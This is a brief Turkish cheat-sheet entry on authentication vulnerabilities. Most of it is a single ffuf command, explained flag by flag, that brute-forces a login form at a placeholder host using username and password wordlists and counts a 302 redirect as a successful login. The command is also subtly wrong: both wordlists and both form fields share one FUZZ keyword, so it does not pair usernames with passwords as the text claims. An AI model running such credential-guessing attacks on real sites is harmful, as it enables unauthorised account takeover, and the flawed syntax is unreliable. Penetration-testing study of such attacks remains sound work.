# Authentication Vulnerabilities (Kimlik Doğrulama Güvenlik Açıkları)

##### ffuf -u http://hedefsite.com/login -X POST -d "username=FUZZ&password=FUZZ" -w /path/to/usernames.txt -w /path/to/passwords.txt -mc 302

- Hedef URL'yi Belirleme : http://hedefsite.com/login
- usernames.txt : Kullanıcı Adı Listesi
- passwords.txt : Şifre Listesi
- -u http://hedefsite.com/login: Hedef URL.
- X POST: HTTP POST isteği kullanmak için.
- d "username=FUZZ&password=FUZZ": FUZZ yerine sırasıyla kullanıcı adı ve şifre listelerindeki değerler girilecek.
- w /path/to/usernames.txt: Kullanıcı adı listesi yolu.
- w /path/to/passwords.txt: Şifre listesi yolu.
- mc 302: 302 yönlendirmesiyle dönen başarılı girişleri gösterecektir (giriş sonrası yönlendirme).